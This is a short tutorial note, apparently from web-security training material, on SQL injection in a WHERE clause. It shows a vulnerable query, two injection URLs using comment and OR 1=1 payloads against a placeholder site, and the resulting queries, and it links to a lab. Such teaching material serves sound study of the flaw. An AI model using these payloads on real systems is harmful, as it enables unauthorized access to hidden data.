# Retrieving hidden data

# Application Query

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

# Attack

## Display Unreleased Product

```
https://insecure-website.com/products?category=Gifts'--
```

Attack Query Result

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The double-dash sequence `-` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment.

## Return ALL items

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Attack Query Result

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since `1=1` is always true, the query will return all items.

# Lab

[**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**](./lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data.md)

